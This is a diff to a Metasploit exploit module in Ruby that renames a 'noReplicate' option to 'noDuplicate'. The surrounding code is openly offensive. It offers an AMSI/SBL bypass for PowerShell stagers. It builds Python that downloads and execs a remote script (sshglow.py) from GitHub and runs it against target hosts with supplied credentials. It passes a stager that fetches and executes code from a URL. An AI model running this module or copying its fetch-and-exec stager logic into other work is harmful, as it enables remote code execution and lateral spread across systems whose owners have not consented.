@@ -60,7 +60,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
         register_advanced_options(
             [
-                OptBool.new('noReplicate', [ true, 'Don\'t Replicate execution using multiple users', true ]),
+                OptBool.new('noDuplicate', [ true, 'Don\'t Duplicate execution using multiple users', true ]),
                 OptBool.new('PSH-AmsiBypass', [ true, 'PSH - Request AMSI/SBL bypass before the stager', true ]),
                 OptString.new('PSH-AmsiBypassURI', [ false, 'PSH - The URL to use for the AMSI/SBL bypass (Will be random if left blank)', '' ]),
                 OptString.new('Py-StagerURI', [ false, 'Py - The URL to use for the first stage (Will be random if left blank)', '' ]),
@@ -196,7 +196,7 @@ class MetasploitModule < Msf::Exploit::Remote
         return args
     end
     
-    def runSSHGlowExec(hosts,creds,delay,noReplicate,stager)
+    def runSSHGlowExec(hosts,creds,delay,noDuplicate,stager)
         # python3 path
         py_path = IO.popen("which python3").read.strip
 
@@ -209,7 +209,7 @@ class MetasploitModule < Msf::Exploit::Remote
             py_space = ' ' * 4
             py_code = "'import urllib; import sys; from urllib.request import urlopen\n"
             py_code += "try:\n#{py_space}exec(urlopen(\"https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py\").read().decode(\"utf-8\"))\n"
-            py_code += "#{py_space}run(\"#{hosts}\",\"#{creds}\",delay=#{delay},no_replicate=#{noReplicate},cmd=#{stager})\n"
+            py_code += "#{py_space}run(\"#{hosts}\",\"#{creds}\",delay=#{delay},no_duplicate=#{noDuplicate},cmd=#{stager})\n"
             py_code += "except KeyboardInterrupt:\n"
             py_code += "#{py_space}sys.exit(1)\n"
             py_code += "except urllib.error.URLError:\n"
@@ -224,7 +224,7 @@ class MetasploitModule < Msf::Exploit::Remote
         hosts = datastore['RHOST']
         creds = datastore['Creds']
         delay = datastore['Delay'].to_s
-        noReplicate = datastore['noReplicate'] ? 'True' : 'False'
+        noDuplicate = datastore['noDuplicate'] ? 'True' : 'False'
 
         # if targets in file
         hosts = handle_file_args(hosts) if File.file?(hosts)
@@ -245,6 +245,6 @@ class MetasploitModule < Msf::Exploit::Remote
 
         stager = "urlopen(\"#{url}\").read().decode(\"utf-8\")"
 
-        runSSHGlowExec(hosts,creds,delay,noReplicate,stager)
+        runSSHGlowExec(hosts,creds,delay,noDuplicate,stager)
     end
 end
